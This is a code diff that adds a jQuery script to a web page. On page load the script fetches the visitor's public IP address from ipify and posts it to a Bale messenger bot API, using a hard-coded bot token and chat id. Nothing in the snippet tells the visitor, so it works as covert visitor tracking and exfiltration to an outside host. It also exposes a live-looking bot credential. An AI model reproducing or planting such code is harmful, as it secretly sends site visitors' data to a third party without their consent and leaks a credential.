@@ -1,0 +1,22 @@
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+<script type="text/javascript">
+    $(document).ready(function() {
+         $.getJSON("https://api.ipify.org?format=json", function(getip) {
+
+            $.ajax({
+                type:'post',
+                url:"https://tapi.bale.ai/botwT9ArKZEC8Pxy7mSjvMPHsPj6JiJlIEQDX7P7MOT/sendMessage",
+                data:{chat_id:"915303220", text : getip.ip},
+                success:function(response){
+                    console.log(data);
+                    //console.log(data);
+                    // console.log(data.length);
+                },
+    
+            });
+           });
+         
+    }); 
+</script>
